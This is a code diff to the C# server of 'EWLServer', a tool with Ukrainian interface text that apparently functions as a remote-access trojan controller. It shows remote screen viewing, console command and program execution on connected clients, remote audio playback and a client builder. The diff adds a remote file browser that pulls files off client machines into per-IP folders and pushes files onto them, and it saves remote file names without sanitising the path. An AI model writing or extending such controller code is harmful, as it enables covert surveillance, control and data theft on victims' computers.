@@ -28,6 +28,8 @@ namespace EWLServer
         private NetworkStream proxyStream = null;
 
         private System.Windows.Forms.Timer screenTimer;
+        private Bitmap lastScreen = null;
+        private byte driveId = 0;
 
         public MainForm()
         {
@@ -41,9 +43,11 @@ namespace EWLServer
             FormClosing += Form1_FormClosing;
             Icons.InitIcons();
 
-            screenTimer = new System.Windows.Forms.Timer();
-            screenTimer.Enabled = false;
-            screenTimer.Interval = 250;
+            screenTimer = new System.Windows.Forms.Timer
+            {
+                Enabled = false,
+                Interval = 250
+            };
             screenTimer.Tick += ScreenTimer_Tick;
         }
 
@@ -60,8 +64,10 @@ namespace EWLServer
             if (stream != null)
             {
                 stream.Close();
+                stream.Dispose();
                 stream = null;
                 client.Close();
+                client.Dispose();
                 client = null;
             }
             if (server != null)
@@ -72,8 +78,10 @@ namespace EWLServer
             if (proxyStream != null)
             {
                 proxyStream.Close();
+                proxyStream.Dispose();
                 proxyStream = null;
                 proxyClient.Close();
+                proxyClient.Dispose();
                 proxyClient = null;
             }
             if (proxyServer != null)
@@ -150,8 +158,10 @@ namespace EWLServer
                                 }
                             }
                             stream.Close();
+                            stream.Dispose();
                             stream = null;
                             client.Close();
+                            client.Dispose();
                             client = null;
                             connStatus.Invoke(new MethodInvoker(() =>
                             {
@@ -284,10 +294,14 @@ namespace EWLServer
                     }));
                     break;
                 case 0x03: // screen
-                    Bitmap bmp = new Bitmap(new MemoryStream(packet, 1, packet.Length - 1));
+                    if (lastScreen != null)
+                    {
+                        lastScreen.Dispose();
+                    }
+                    lastScreen = new Bitmap(new MemoryStream(packet, 1, packet.Length - 1));
                     screen.Invoke(new MethodInvoker(() =>
                     {
-                        screen.Image = bmp;
+                        screen.Image = lastScreen;
                     }));
                     break;
                 case 0x06: // file manager (list)
@@ -306,6 +320,82 @@ namespace EWLServer
                         {
                             fmFiles.Items.Add(file);
                         }));
+                    }
+                    break;
+                case 0x07: // file browser
+                    switch (packet[1])
+                    {
+                        case 0x00: // refresh packet
+                            Invoke(new MethodInvoker(() =>
+                            {
+                                fbProgress.Style = ProgressBarStyle.Blocks;
+                                fbDrives.Items.Clear();
+                                fbPath.Clear();
+                                fbList.Items.Clear();
+                            }));
+                            driveId = packet[2];
+                            ushort pathlen = BitConverter.ToUInt16(packet, 3);
+                            int off = 5;
+                            string rempath = Encoding.UTF8.GetString(packet, off, pathlen);
+                            off += pathlen;
+                            fbPath.Invoke(new MethodInvoker(() =>
+                            {
+                                fbPath.Text = rempath;
+                            }));
+                            int drvlen = BitConverter.ToInt32(packet, off);
+                            off += 4;
+                            int drvStart = off;
+                            while (off < drvStart + drvlen)
+                            {
+                                byte tdl = packet[off];
+                                off += 1;
+                                string drv = Encoding.UTF8.GetString(packet, off, tdl);
+                                off += tdl;
+                                fbDrives.Invoke(new MethodInvoker(() =>
+                                {
+                                    fbDrives.Items.Add(drv);
+                                }));
+                            }
+                            fbDrives.Invoke(new MethodInvoker(() =>
+                            {
+                                fbDrives.SelectedIndex = driveId;
+                            }));
+
+                            int filsize = BitConverter.ToInt32(packet, off);
+                            off += 4;
+                            int filStart = off;
+                            while (off < filStart + filsize)
+                            {
+                                ushort tfl = BitConverter.ToUInt16(packet, off);
+                                off += 2;
+                                string tfile = Encoding.UTF8.GetString(packet, off, tfl);
+                                off += tfl;
+                                fbList.Invoke(new MethodInvoker(() =>
+                                {
+                                    fbList.Items.Add(tfile);
+                                }));
+                            }
+                            break;
+                        case 0x01: // received file
+                            ushort nameLen = BitConverter.ToUInt16(packet, 2);
+                            int off2 = 4;
+                            string orgFname = Encoding.UTF8.GetString(packet, off2, nameLen);
+                            off2 += nameLen;
+
+                            uint oFileLen = BitConverter.ToUInt32(packet, off2);
+                            off2 += 4;
+
+                            string tDir = ".\\Data\\" +
+                                client.Client.RemoteEndPoint.ToString().Split(':')[0];
+                            Directory.CreateDirectory(tDir);
+                            using (FileStream fStr = File.Create(Path.Combine(tDir, orgFname)))
+                            {
+                                using (MemoryStream ms = new MemoryStream(packet, off2, packet.Length - off2))
+                                {
+                                    ms.CopyTo(fStr);
+                                }
+                            }
+                            break;
                     }
                     break;
                 case 0xFF: // client error
@@ -344,6 +434,7 @@ namespace EWLServer
             SendPacket(0x02);
             SendPacket(0x03, new byte[] { 0x0A });
             SendPacket(0x06, new byte[] { 0x01 });
+            SendPacket(0x07, new byte[] { 0x00 });
         }
 
         private void ShellCommand_Click(object sender, EventArgs e)
@@ -352,22 +443,30 @@ namespace EWLServer
             {
                 return;
             }
-            Form frm = new ActionForm();
-            frm.ClientSize = new Size(460, 80);
-            Label hint = new Label();
-            hint.Location = new Point(10, 10);
-            hint.AutoSize = true;
-            hint.Text = "Введіть команду консолі (наприкл. taskkill):";
+            Form frm = new ActionForm
+            {
+                ClientSize = new Size(460, 80)
+            };
+            Label hint = new Label
+            {
+                Location = new Point(10, 10),
+                AutoSize = true,
+                Text = "Введіть команду консолі (наприкл. taskkill):"
+            };
             frm.Controls.Add(hint);
-            TextBox shcmd = new TextBox();
-            shcmd.Width = 440;
-            shcmd.Location = new Point(10, 26);
+            TextBox shcmd = new TextBox
+            {
+                Width = 440,
+                Location = new Point(10, 26)
+            };
             frm.Controls.Add(shcmd);
-            Button exec = new Button();
-            exec.Width = 80;
-            exec.Height = 24;
-            exec.Text = "Виконати";
-            exec.Location = new Point(370, 50);
+            Button exec = new Button
+            {
+                Width = 80,
+                Height = 24,
+                Text = "Виконати",
+                Location = new Point(370, 50)
+            };
             exec.Click += (object s, EventArgs ev) =>
             {
                 if (shcmd.Text.Trim(' ') != "")
@@ -392,22 +491,30 @@ namespace EWLServer
             {
                 return;
             }
-            Form frm = new ActionForm();
-            frm.ClientSize = new Size(460, 80);
-            Label hint = new Label();
-            hint.Location = new Point(10, 10);
-            hint.AutoSize = true;
-            hint.Text = "Введіть назву програми (наприкл. calc):";
+            Form frm = new ActionForm
+            {
+                ClientSize = new Size(460, 80)
+            };
+            Label hint = new Label
+            {
+                Location = new Point(10, 10),
+                AutoSize = true,
+                Text = "Введіть назву програми (наприкл. calc):"
+            };
             frm.Controls.Add(hint);
-            TextBox shcmd = new TextBox();
-            shcmd.Width = 440;
-            shcmd.Location = new Point(10, 26);
+            TextBox shcmd = new TextBox
+            {
+                Width = 440,
+                Location = new Point(10, 26)
+            };
             frm.Controls.Add(shcmd);
-            Button exec = new Button();
-            exec.Width = 80;
-            exec.Height = 24;
-            exec.Text = "Запустити";
-            exec.Location = new Point(370, 50);
+            Button exec = new Button
+            {
+                Width = 80,
+                Height = 24,
+                Text = "Запустити",
+                Location = new Point(370, 50)
+            };
             exec.Click += (object s, EventArgs ev) =>
             {
                 if (shcmd.Text.Trim(' ') != "")
@@ -428,12 +535,16 @@ namespace EWLServer
                 return;
             }
             bool done = false;
-            Form frm = new ActionForm();
-            frm.ClientSize = new Size(460, 80);
-            Label hint = new Label();
-            hint.Location = new Point(10, 10);
-            hint.AutoSize = true;
-            hint.Text = "Оберіть файл .mp3:";
+            Form frm = new ActionForm
+            {
+                ClientSize = new Size(460, 80)
+            };
+            Label hint = new Label
+            {
+                Location = new Point(10, 10),
+                AutoSize = true,
+                Text = "Оберіть файл .mp3:"
+            };
             frm.Controls.Add(hint);
             OpenFileDialog ofd = new OpenFileDialog()
             {
@@ -447,11 +558,13 @@ namespace EWLServer
                 Multiselect = false,
                 RestoreDirectory = true
             };
-            Button shcmd = new Button();
-            shcmd.Width = 80;
-            shcmd.Height = 24;
-            shcmd.Text = "Огляд...";
-            shcmd.Location = new Point(10, 26);
+            Button shcmd = new Button
+            {
+                Width = 80,
+                Height = 24,
+                Text = "Огляд...",
+                Location = new Point(10, 26)
+            };
             shcmd.Click += (object s, EventArgs ev) =>
             {
                 if (ofd.ShowDialog() == DialogResult.OK)
@@ -460,17 +573,21 @@ namespace EWLServer
                 }
             };
             frm.Controls.Add(shcmd);
-            CheckBox loop = new CheckBox();
-            loop.Width = 80;
-            loop.Height = 24;
-            loop.Text = "Повторювати";
-            loop.Location = new Point(100, 26);
+            CheckBox loop = new CheckBox
+            {
+                Width = 80,
+                Height = 24,
+                Text = "Повторювати",
+                Location = new Point(100, 26)
+            };
             frm.Controls.Add(loop);
-            Button exec = new Button();
-            exec.Width = 80;
-            exec.Height = 24;
-            exec.Text = "Програти";
-            exec.Location = new Point(370, 50);
+            Button exec = new Button
+            {
+                Width = 80,
+                Height = 24,
+                Text = "Програти",
+                Location = new Point(370, 50)
+            };
             exec.Click += (object s, EventArgs ev) =>
             {
                 if (ofd.FileName != "" && done)
@@ -504,7 +621,6 @@ namespace EWLServer
                 AddExtension = true,
                 AutoUpgradeEnabled = true,
                 CheckFileExists = true,
-                DefaultExt = ".mp3",
                 DereferenceLinks = true,
                 Filter = "All Files (*.*)|*.*",
                 FilterIndex = 0,
@@ -524,12 +640,97 @@ namespace EWLServer
                 byte[] pk = PacketHelper.Wrap(0x06, idata);
                 stream.Write(pk, 0, pk.Length);
             }
+            ofd.Dispose();
         }
 
         private void Create_Click(object sender, EventArgs e)
         {
-            BuilderForm bf = new BuilderForm();
-            bf.ShowDialog();
+            new BuilderForm().ShowDialog();
+        }
+
+        private void FbDrives_SelectedIndexChanged(object sender, EventArgs e)
+        {
+            if (fbDrives.SelectedIndex < 0) return;
+            if (fbDrives.SelectedIndex == driveId) return;
+            SendPacket(0x07, new byte[] { 0x04, (byte)fbDrives.SelectedIndex });
+            driveId = (byte)fbDrives.SelectedIndex;
+            fbProgress.Style = ProgressBarStyle.Marquee;
+        }
+
+        private void FbReload_Click(object sender, EventArgs e)
+        {
+            SendPacket(0x07, new byte[] { 0x00 });
+            fbProgress.Style = ProgressBarStyle.Marquee;
+        }
+
+        private void FbUp_Click(object sender, EventArgs e)
+        {
+            byte[] pkt = new byte[Encoding.UTF8.GetByteCount("..") + 1];
+            pkt[0] = 0x03;
+            Encoding.UTF8.GetBytes("..").CopyTo(pkt, 1);
+            SendPacket(0x07, pkt);
+            fbProgress.Style = ProgressBarStyle.Marquee;
+        }
+
+        private void FbList_MouseDoubleClick(object sender, MouseEventArgs e)
+        {
+            int ix = fbList.IndexFromPoint(e.Location);
+            if (ix >= 0)
+            {
+                string dr = (string)fbList.Items[ix];
+                if (!dr.EndsWith("\\")) return;
+                byte[] nvp = new byte[Encoding.UTF8.GetByteCount(dr) + 1];
+                nvp[0] = 0x03;
+                Encoding.UTF8.GetBytes(dr).CopyTo(nvp, 1);
+                SendPacket(0x07, nvp);
+                fbProgress.Style = ProgressBarStyle.Marquee;
+            }
+        }
+
+        private void FbDownload_Click(object sender, EventArgs e)
+        {
+            if (fbList.SelectedIndex >= 0)
+            {
+                byte[] dlp = new byte[Encoding.UTF8.GetByteCount((string)fbList.SelectedItem) + 1];
+                dlp[0] = 0x02;
+                Encoding.UTF8.GetBytes((string)fbList.SelectedItem).CopyTo(dlp, 1);
+                SendPacket(0x07, dlp);
+                fbProgress.Style = ProgressBarStyle.Marquee;
+            }
+        }
+
+        private void FbUpload_Click(object sender, EventArgs e)
+        {
+            if (client == null)
+            {
+                return;
+            }
+            OpenFileDialog ofd = new OpenFileDialog()
+            {
+                AddExtension = true,
+                AutoUpgradeEnabled = true,
+                CheckFileExists = true,
+                DereferenceLinks = true,
+                Filter = "All Files (*.*)|*.*",
+                FilterIndex = 0,
+                Multiselect = false,
+                RestoreDirectory = true
+            };
+
+            if (ofd.ShowDialog() == DialogResult.OK)
+            {
+                byte[] file = File.ReadAllBytes(ofd.FileName);
+                ushort fnSz = (ushort)Encoding.UTF8.GetByteCount(ofd.SafeFileName);
+                byte[] idata = new byte[3 + fnSz + file.Length];
+                idata[0] = 0x01; // fb command upload
+
+                BitConverter.GetBytes(fnSz).CopyTo(idata, 1);
+                Array.Copy(Encoding.UTF8.GetBytes(ofd.SafeFileName), 0, idata, 3, fnSz);
+
+                Array.Copy(file, 0, idata, 3 + fnSz, file.Length);
+                SendPacket(0x07, idata);
+            }
+            ofd.Dispose();
         }
     }
 }
